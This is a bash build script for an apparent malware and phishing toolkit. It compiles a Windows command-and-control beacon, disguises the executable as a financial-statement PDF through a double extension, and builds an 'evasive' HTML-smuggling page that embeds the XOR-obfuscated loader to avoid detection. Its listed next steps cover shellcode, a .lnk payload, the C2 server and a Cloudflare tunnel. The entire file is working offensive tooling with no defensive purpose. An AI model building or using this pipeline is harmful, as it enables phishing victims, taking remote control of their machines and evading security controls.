#!/usr/bin/env bash
# build.sh - build the umbra beacon and stage the delivery site into dist/.
#
# Run from the umbra module root:  bash scripts/build.sh [options]
#
# The public endpoint, passphrase and ports come from scripts/umbra.env (copy
# scripts/umbra.env.example once) so the beacon URL matches the domain the tunnel
# publishes. Any option below can still be overridden per run.
#
# Options (env vars):
#   SERVER   C2 endpoint URL   (default https://$DOMAIN$C2_PREFIX v2/sync)
#   PASS     shared passphrase (default from C2_PASS, else change-me-passphrase)
#   PIN      server leaf cert SHA-256 hex (optional; empty = accept any cert)
#   SLEEP    base sleep seconds (default 10)
#   JITTER   jitter percent     (default 25)
#   UA       User-Agent override (optional)
#   MODE     beacon | staged    (default beacon)
set -euo pipefail
cd "$(dirname "$0")/.."

# --- shared session config (single source of truth) --------------------------
load_env() {
  local f="$1" line k v
  [ -f "$f" ] || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in ''|'#'*) continue ;; esac
    k="${line%%=*}"; v="${line#*=}"
    k="$(printf '%s' "$k" | tr -d '[:space:]')"
    [ -n "$k" ] || continue
    [ -n "${!k:-}" ] && continue
    case "$v" in
      \"*\") v="${v#\"}"; v="${v%\"}" ;;
      \'*\') v="${v#\'}"; v="${v%\'}" ;;
    esac
    export "$k=$v"
  done < "$f"
}
load_env scripts/umbra.env

DOMAIN="${DOMAIN:-c2.example.com}"
C2_PREFIX="${C2_PREFIX:-/updates/}"

SERVER="${SERVER:-https://${DOMAIN}${C2_PREFIX}v2/sync}"
PASS="${PASS:-${C2_PASS:-change-me-passphrase}}"
PIN="${PIN:-}"
SLEEP="${SLEEP:-10}"
JITTER="${JITTER:-25}"
UA="${UA:-}"
MODE="${MODE:-beacon}"

GO="${GO:-go}"
OUT="dist"
# Disguised direct-exe copy staged for the phish page (delivery/phish.html
# PAYLOAD_URL/PAYLOAD_NAME). Same bytes as loader.exe; the ".pdf.exe" double
# extension reads as a PDF under Windows' default "hide known extensions".
PAYLOAD_NAME="${PAYLOAD_NAME:-2026-Q3_Financial_Statement.pdf.exe}"
# Name shown on the decoy document card of the landing page.
DOC_NAME="${DOC_NAME:-2026-Q3_Financial_Statement.pdf}"
# SMUGGLE=1 (default) builds the evasive, SELF-CONTAINED dist/index.html that
# carries loader.exe inside the page (XOR + shuffled alphabet + chunks; see
# scripts/make_smuggle.py). SMUGGLE=0 falls back to the plain anchor page.
SMUGGLE="${SMUGGLE:-1}"
PY="${PY:-python3}"
mkdir -p "$OUT"

echo "[*] packing beacon config (mode=$MODE)"
pack_args=(-server "$SERVER" -pass "$PASS" -sleep "$SLEEP" -jitter "$JITTER" -out cmd/beacon/config.go)
[ -n "$PIN" ] && pack_args+=(-pin "$PIN")
[ -n "$UA" ] && pack_args+=(-ua "$UA")
"$GO" run ./cmd/pack "${pack_args[@]}"

echo "[*] building loader (windows/amd64)"
# -H=windowsgui suppresses the console window flash when loader.exe is started
# directly (curl/.vbs delivery). Harmless for the reflect path, where the
# powershell host owns the console anyway.
GOOS=windows GOARCH=amd64 "$GO" build -trimpath -ldflags "-s -w -H=windowsgui" \
  -o "$OUT/loader.exe" ./cmd/beacon

echo "[*] staging the delivery site into $OUT/"
cp delivery/phish.html  "$OUT/phish.html"
cp delivery/stage.ps1   "$OUT/stage.ps1"
cp delivery/reflect.ps1 "$OUT/reflect.ps1"
cp "$OUT/loader.exe"    "$OUT/$PAYLOAD_NAME"

# Landing page served as https://$DOMAIN/ . Default: the evasive self-contained
# smuggle page - the payload is embedded in the HTML, so there is no second
# request for an .exe/.lnk and no plain-base64 / TVqQ signature.
if [ "$SMUGGLE" = "1" ]; then
  echo "[*] building evasive smuggle landing page -> $OUT/index.html"
  verify_flag=""
  if command -v node >/dev/null 2>&1; then verify_flag="--verify"; fi
  "$PY" scripts/make_smuggle.py --in "$OUT/loader.exe" --out "$OUT/index.html" \
      --name "$PAYLOAD_NAME" --doc "$DOC_NAME" $verify_flag
else
  echo "[*] SMUGGLE=0: using the plain anchor page for $OUT/index.html"
  cp delivery/phish.html "$OUT/index.html"
fi

echo "[+] done:"
ls -lh "$OUT/loader.exe" "$OUT/$PAYLOAD_NAME" "$OUT/index.html" "$OUT/stage.ps1"
echo
echo "    next:"
echo "      dist/index.html is READY to serve (evasive smuggle page w/ embedded payload)."
echo "      bash scripts/make_shellcode.sh --from-pe $OUT/loader.exe   # -> dist/blob.hex (only for the .lnk/stage flow)"
echo "      bash scripts/make_lnk_payload.sh                          # -> dist/2026-Q3_Financial_Statement.pdf.lnk"
echo "      ./$OUT/server -listen 127.0.0.1:8443 -pass '$PASS' -certdir $OUT/c2data"
echo "      bash scripts/serve.sh"
echo "      bash scripts/cf_tunnel.sh"
echo "      bash scripts/verify.sh                                     # check the PUBLIC edge afterwards"
echo
echo "    notes:"
echo "      - serve.sh and cf_tunnel.sh both read scripts/umbra.env (HTTP_PORT etc)."
echo "        Set HTTP_PORT there ONCE; do not edit ports inside either script."
echo "      - do NOT pin the origin cert: through the tunnel the edge presents the"
echo "        Cloudflare certificate, so -pin with the origin fingerprint breaks the"
echo "        beacon. Leave PIN empty (recommended)."
